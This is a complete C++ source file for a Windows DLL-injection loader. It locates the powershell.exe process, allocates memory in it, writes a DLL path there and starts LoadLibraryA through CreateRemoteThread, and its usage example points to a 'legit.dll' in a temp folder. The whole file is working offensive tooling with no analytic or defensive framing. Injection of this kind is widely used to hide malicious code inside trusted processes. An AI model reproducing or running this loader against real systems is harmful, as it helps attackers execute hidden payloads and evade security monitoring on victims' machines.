#include <Windows.h>
#include<tlhelp32.h>
#include<psapi.h>
#include <iostream>

void LogWinApiError(std::string failedFunctionName)
{
	std::cout << "[X] ERROR - " << failedFunctionName << " WINAPI failed with error code: " << GetLastError() << std::endl;
}
void LogMessage(std::string message)
{
	std::cout << message << std::endl;
}
DWORD GetProcPid(std::string targetProcName)
{
	DWORD result = 0;
	DWORD pid = 0;
	PROCESSENTRY32W procEntry = { 0 };
	procEntry.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE snapshotHandle = INVALID_HANDLE_VALUE;
	snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	if (snapshotHandle == INVALID_HANDLE_VALUE)
	{
		LogWinApiError("CreateToolhelp32Snapshot");
		return 0;
	}

	result = Process32FirstW(snapshotHandle, &procEntry);
	if (result)
	{
		std::wstring procNameW = procEntry.szExeFile;
		std::string procNameA(procNameW.begin(), procNameW.end());
		if (procNameA == targetProcName)
		{
			pid = procEntry.th32ProcessID;
		}
		while (Process32NextW(snapshotHandle, &procEntry) && pid == 0)
		{
			procNameW = procEntry.szExeFile;
			std::string aux(procNameW.begin(), procNameW.end());
			if (aux == targetProcName)
			{
				pid = procEntry.th32ProcessID;
			}
		}
	}
	else
	{
		LogWinApiError("Process32FirstW");
	}

	CloseHandle(snapshotHandle);
	return pid;
}
BOOL CheckProcArgs(INT argc, CHAR** argv)
{
	if (argc != 2)
	{
		LogMessage("[X] FAIL - Invalid syntax! Program has one required argument: path_to_dll");
		LogMessage("Example:");
		LogMessage("./loader.exe C:\\Windows\\Temp\\legit.dll");
		return FALSE;
	}

	HANDLE dllHandle = CreateFileA(argv[1], GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (dllHandle == INVALID_HANDLE_VALUE)
	{
		LogWinApiError("CreateFileA");
		LogMessage("[X] FAIL - Failed to get a handle to the DLL at the given path. Exiting...");
		return FALSE;
	}

	CloseHandle(dllHandle);
	return TRUE;
}

INT main(INT argc, CHAR** argv)
{
	if (!CheckProcArgs(argc, argv))
	{
		return EXIT_FAILURE;
	}

	HANDLE injectedThread = 0;
	DWORD status = EXIT_FAILURE;
	std::string dllPath = argv[1];

	HMODULE kernel32dll = GetModuleHandleA("kernel32.dll");
	if (!kernel32dll)
	{
		LogWinApiError("GetModuleHandleA");
		LogMessage("[X] FAIL - Failed to get the base address of kernel32.dll. Exiting...");
		return EXIT_FAILURE;
	}

	PVOID pLoadLibraryA = GetProcAddress(kernel32dll, "LoadLibraryA");
	if (!pLoadLibraryA)
	{
		LogWinApiError("GetProcAddress");
		LogMessage("[X] FAIL - Failed to get the address of the LoadLibraryA function. Exiting...");
		return EXIT_FAILURE;
	}

	DWORD targetProcPid = GetProcPid("powershell.exe");
	if (!targetProcPid)
	{
		LogMessage("[X] FAIL - Failed to get the PID of the target process. Make sure the process is running. Exiting...");
		return EXIT_FAILURE;
	}

	HANDLE targetProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcPid);
	if (!targetProcHandle)
	{
		LogWinApiError("OpenProcess");
		LogMessage("[X] FAIL - Failed to open a handle to the target process.  Exiting...");
		return EXIT_FAILURE;
	}

	PVOID pathToOurDll = VirtualAllocEx(targetProcHandle, NULL, dllPath.size()+1, MEM_COMMIT, PAGE_READWRITE);
	if (!pathToOurDll)
	{
		LogWinApiError("VirtualAllocEx");
		LogMessage("[X] FAIL - Failed to allocate memory in the target process. Exiting...");
		goto cleanup_proc_handle;
	}

	if (!WriteProcessMemory(targetProcHandle, pathToOurDll, dllPath.c_str(), dllPath.size()+1, NULL))
	{
		LogWinApiError("WriteProcessMemory");
		LogMessage("[X] FAIL - Failed to write the DLL to the target process. Exiting...");
		goto cleanup_memory;
	}

	injectedThread = CreateRemoteThread(targetProcHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pathToOurDll, NULL, NULL);
	if (!injectedThread)
	{
		LogWinApiError("CreateRemoteThread");
		LogMessage("[X] FAIL - Failed to create the remote thread in the target process. Exiting...");
		goto cleanup_memory;
	}

	WaitForSingleObject(injectedThread, INFINITE);
	LogMessage("[+] SUCCESS - DLL Injected in the target process!");
	status = EXIT_SUCCESS;

	CloseHandle(injectedThread);
cleanup_memory:
	VirtualFreeEx(targetProcHandle, pathToOurDll, NULL, MEM_RELEASE);
cleanup_proc_handle:
	CloseHandle(targetProcHandle);
	return status;

}
